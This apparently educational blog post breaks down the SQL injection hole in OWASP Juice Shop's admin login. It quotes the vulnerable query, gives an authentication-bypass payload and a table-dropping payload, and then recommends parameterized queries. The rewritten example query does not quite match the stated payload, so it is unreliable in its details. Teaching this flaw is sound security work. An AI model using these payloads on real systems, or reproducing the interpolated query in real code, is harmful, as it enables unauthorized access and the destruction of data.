This blog explains a breakdown of the SQLi vulnerbility in LoginAdmin page of OWASP juice shop

## Code Review

```
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}'
AND password = '${security.hash(req.body.password || '')}'
AND deletedAt IS NULL`, { model: models.User, plain: true })

```

- The values req.body.email and security.hash(req.body.password) are directly inserted into the SQL query as string interpolation.
- This makes the query vulnerable to SQL Injection if an attacker provides malicious input.

## How can an Attacker Exploit This

If an attacker enters this in the email field:

```
admin' or 1=1;--
```

Then the query becomes:

```
SELECT * FROM Users WHERE email = 'admin' OR '1'='1';
AND password = 'somehash'
AND deletedAt IS NULL
```

Breaking it down:

- email = 'admin' → Checks if the username is admin.
- 1=1 → Always TRUE (since 1=1 is always true).
- -- → This is a comment in SQL, which ignores the rest of the query (AND password = '' is ignored).

- Since '1'='1' is always true, the query could return the all users, bypassing authentication.
- An attacker could log in as the first user in the database (often an admin).

More Advanced Attack
Attacker inputs

```
'; DROP TABLE Users; --
```

The SQL query might execute:

```
SELECT * FROM Users WHERE email = ''; DROP TABLE Users; --' AND password = 'somehash' AND deletedAt IS NULL
```

### Takeaways

1. admin' OR 1=1;-- bypasses authentication by always making the condition true.
2. Using raw SQL queries with user input is dangerous (unless properly handled).
3. Fix it with parameterized queries or ORM methods.
4. Enhance security with rate limiting, MFA, and password hashing.
